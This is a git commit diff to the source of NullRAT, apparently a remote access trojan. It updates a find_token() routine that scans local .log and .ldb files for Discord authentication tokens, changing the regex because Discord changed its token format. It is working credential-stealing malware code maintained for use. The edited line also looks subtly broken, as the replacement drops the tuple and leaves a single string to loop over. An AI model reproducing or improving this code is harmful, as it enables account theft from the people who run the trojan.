b0c2a4db0a30ece577c091e7fdbab9fa728dca7e
NullCode <contact.nullcode@proton.me>
2022-05-17 13:56:18 +0600

    Update token regex cuz discord updated it

--- NullRAT/RAT.py
+++ NullRAT/RAT.py
@@ -354,7 +354,7 @@ def find_token():
                 if not file_name.endswith('.log') and not file_name.endswith('.ldb'): 
                     continue
                 for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"):
                         for token in re.findall(regex, line): 
                             tokens.append(token)
         except FileNotFoundError: continue
